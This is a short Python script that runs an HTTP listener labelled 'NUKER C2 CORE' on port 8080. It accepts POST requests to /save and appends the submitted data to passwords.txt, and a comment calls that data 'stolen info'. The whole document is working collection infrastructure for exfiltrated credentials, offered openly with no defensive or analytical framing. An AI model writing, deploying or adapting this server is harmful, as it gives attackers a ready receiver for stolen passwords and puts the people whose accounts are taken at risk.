import http.server
import json

class NukerHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/save':
            length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(length)
            payload = json.loads(raw_data)['data']
            
            # Writing the stolen info to the file
            with open("passwords.txt", "a") as f:
                f.write(payload + "\n")
            
            print(f"[NUKER] Data Saved: {payload}")
            self.send_response(200)
            self.end_headers()

print("NUKER C2 CORE RUNNING ON PORT 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), NukerHandler).serve_forever()
